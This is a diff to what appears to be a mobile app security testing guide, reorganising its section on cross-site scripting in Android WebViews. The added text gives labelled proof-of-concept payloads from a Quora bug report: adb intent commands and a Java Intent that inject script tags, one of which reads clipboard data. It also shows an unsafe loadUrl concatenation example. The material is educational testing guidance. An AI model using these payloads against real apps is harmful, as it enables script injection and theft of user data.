@@ -163,7 +163,16 @@ In the context of *native apps*, XSS risks are far less prevalent for the simple
 
 An older but well-known example is the [local XSS issue in the Skype app for iOS, first identified by Phil Purviance]( https://superevr.com/blog/2011/xss-in-skype-for-ios). The Skype app failed to properly encode the name of the message sender, allowing an attacker to inject malicious JavaScript to be executed when a user views the message. In his proof-of-concept, Phil showed how to exploit the issue and steal a user's address book.
 
-Another example is using overriden methods that trust html parameter data. 
+#### Static Analysis
+
+Take a close look at any WebViews present and investigate for untrusted input rendered by the app.
+
+XSS issues may exist if the URL opened by WebView is partially determined by user input. The following example is from an XSS issue in the [Zoho Web Service, reported by Linus Särud](https://labs.detectify.com/2015/02/20/finding-an-xss-in-an-html-based-android-application/).
+
+```java
+webView.loadUrl("javascript:initialize(" + myNumber + ");");
+```
+Another example of XSS issues determined by user input is public overriden methods. 
 
 ```java
 @Override
@@ -176,26 +185,22 @@ public boolean shouldOverrideUrlLoading(WebView view, String url) {
 
 Sergey Bobrov was able to take advantage of this in the following [HackerOne report](https://hackerone.com/reports/189793). Any input to the html parameter would be trusted in Quora's ActionBarContentActivity. Payloads were successful using adb, clipboarddata via ModalContentActivity, and Intents from 3rd party applications.
 
+- ADB
 ```bash
 adb shell
 am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html 'XSS<script>alert(123)</script>'
 ```
+- Writing to clipboard
+```bash
+am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipboardData());</script>'
+```
+- 3rd party Intent
 ```java
 Intent i = new Intent();
 i.setComponent(new ComponentName("com.quora.android","com.quora.android.ActionBarContentActivity"));
 i.putExtra("url","http://test/test");
 i.putExtra("html","XSS PoC <script>alert(123)</script>");
 startActivity(i);
-```
-
-#### Static Analysis
-
-Take a close look at any WebViews present and investigate for untrusted input rendered by the app.
-
-XSS issues may exist if the URL opened by WebView is partially determined by user input. The following example is from an XSS issue in the [Zoho Web Service, reported by Linus Särud](https://labs.detectify.com/2015/02/20/finding-an-xss-in-an-html-based-android-application/).
-
-```java
-webView.loadUrl("javascript:initialize(" + myNumber + ");");
 ```
 
 If WebView is used to display a remote website, the burden of escaping HTML shifts to the server side. If an XSS flaw exists on the web server, this can be used to execute script in the context of the WebView. As such, it is important to perform static analysis of the web application source code.
